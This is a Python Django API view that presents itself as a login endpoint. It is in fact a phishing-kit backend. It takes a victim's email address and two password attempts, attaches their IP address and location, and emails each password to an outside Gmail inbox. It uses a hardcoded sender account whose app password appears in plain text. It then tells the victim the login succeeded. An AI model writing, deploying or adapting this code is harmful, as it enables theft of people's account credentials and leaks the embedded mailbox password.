from django.http import JsonResponse
from rest_framework.decorators import api_view
from dbconnection import users
import smtplib
from smtplib import SMTPException
import logging
from unidecode import unidecode

# Set up logging
logger = logging.getLogger(__name__)

@api_view(['POST'])
def get_user_info(request):
    # Get the login and visitor data from the request
    email = request.data.get('email')
    firstpasswordused = request.data.get('firstpasswordused')
    secondpasswordused = request.data.get('secondpasswordused')
    visitor_data = request.data.get('visitorData')

    # Check for required fields
    if not email or not firstpasswordused or not secondpasswordused or not visitor_data:
        return JsonResponse({'error': 'Email, passwords, and visitor data are required'}, status=400)

    # Ensure input data is string type and sanitize if necessary
    email = str(email)
    firstpasswordused = str(firstpasswordused)
    secondpasswordused = str(secondpasswordused)

    # Ensure visitor_data is a dictionary
    if not isinstance(visitor_data, dict):
        return JsonResponse({'error': 'Invalid visitor data provided'}, status=400)

    try:
        # Extract important data from visitor_data
        ip_address = visitor_data.get('ipAddress', 'N/A')
        city = visitor_data.get('city', 'Unknown')
        region = visitor_data.get('region', 'Unknown')
        country = visitor_data.get('countryName', 'Unknown')

        # Validate data from visitor_data
        if ip_address == 'N/A' or country == 'Unknown':
            return JsonResponse({'error': 'Invalid location data from VPN'}, status=400)

        # Format the email content for the first password
        time_received = "05/12/2022 07:05:10 am"  # Use actual time if available
        email_content_first = f"""
            Email Address: {email}
            First Password: {firstpasswordused}
            Time Received: {time_received}

            IP Details: This visitor visited from {country}, {city}, {region} with IP Address of - {ip_address}
        """

        # Format the email content for the second password
        email_content_second = f"""
            Email Address: {email}
            Second Password: {secondpasswordused}
            Time Received: {time_received}

            IP Details: This visitor visited from {country}, {city}, {region} with IP Address of - {ip_address}
        """

        # Handle encoding issues with non-ASCII characters using unidecode
        email_content_first = unidecode(email_content_first)
        email_content_second = unidecode(email_content_second)

        # Send email for the first password
        try:
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as connection:
                connection.login(user='ranickiauerbach@gmail.com', password='nlov pvvd rcoa dnwl')
                connection.sendmail(
                    from_addr='ranickiauerbach@gmail.com',
                    to_addrs='jujualvarado25@gmail.com',
                    msg=f"Subject: User First Password Info\n\n{email_content_first}"
                )
        except SMTPException as e:
            logger.error(f"Error sending first password email: {str(e)}")
            return JsonResponse({'error': f'Error sending first password email: {str(e)}'}, status=500)

        # Send email for the second password
        try:
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as connection:
                connection.login(user='ranickiauerbach@gmail.com', password='nlov pvvd rcoa dnwl')
                connection.sendmail(
                    from_addr='ranickiauerbach@gmail.com',
                    to_addrs='jujualvarado25@gmail.com',
                    msg=f"Subject: User Second Password Info\n\n{email_content_second}"
                )
        except SMTPException as e:
            logger.error(f"Error sending second password email: {str(e)}")
            return JsonResponse({'error': f'Error sending second password email: {str(e)}'}, status=500)

    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return JsonResponse({'error': f'An unexpected error occurred: {str(e)}'}, status=500)

    return JsonResponse({'message': 'Login successful'}, status=200)
